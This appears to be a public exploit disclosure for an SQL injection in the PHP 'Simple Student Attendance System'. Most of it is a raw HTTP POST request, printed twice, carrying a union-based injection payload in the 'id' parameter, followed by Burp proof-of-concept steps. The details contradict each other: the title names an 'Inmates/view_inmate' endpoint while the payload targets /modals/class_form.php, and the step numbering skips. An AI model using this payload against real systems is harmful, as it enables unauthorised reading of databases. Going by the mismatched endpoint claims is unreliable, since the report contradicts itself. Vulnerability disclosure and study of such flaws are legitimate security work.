# Simple_Student_Attendance_System  - Inmates/view_inmate 'id' SQL inject(SQLI)


#### Exploit Title: Simple_Student_Attendance_System  - Inmates/view_inmate 'id' SQL inject(SQLI)
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://www.sourcecodester.com/php/17018/simple-student-attendance-system-using-php-and-mysql.html
#### Software Link:https://www.sourcecodester.com/download-code?nid=17018&title=Simple+Student+Attendance+System+using+PHP+and+MySQL
#### Version: Simple_Student_Attendance_System
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Online student management system does not filter the content correctly at the "Inmates/view_inmate" id" parameter, resulting in the generation of SQL injection.

#### Payload used:

```
POST /modals/class_form.php HTTP/1.1
Host: 192.168.67.10
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 46
Origin: http://192.168.67.10
Connection: close
Referer: http://192.168.67.10/?page=class_list
Cookie: PHPSESSID=psarlfq242067i9u428ih8b82d

id=1' and 1=2 union select 1,database(),3,4--+
```



#### Proof of Concept

1. Open Page http://192.168.67.10/?page=class_list, click `edit`  

   ![image-20231225144253666](img/Simple_Student_Attendance_System(SQLI)/image-20231225144253666.png)

   

2. Put SQL payload   in the BURP;

   

   ```
   POST /modals/class_form.php HTTP/1.1
   Host: 192.168.67.10
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
   Accept: */*
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate
   Content-Type: application/x-www-form-urlencoded; charset=UTF-8
   X-Requested-With: XMLHttpRequest
   Content-Length: 46
   Origin: http://192.168.67.10
   Connection: close
   Referer: http://192.168.67.10/?page=class_list
   Cookie: PHPSESSID=psarlfq242067i9u428ih8b82d
   
   id=1' and 1=2 union select 1,database(),3,4--+
   ```

   


4. Viewing the Response;

   

![image-20231225144342061](img/Simple_Student_Attendance_System(SQLI)/image-20231225144342061.png)



![image-20231225144409034](img/Simple_Student_Attendance_System(SQLI)/image-20231225144409034.png)

![image-20231225144434961](img/Simple_Student_Attendance_System(SQLI)/image-20231225144434961.png)
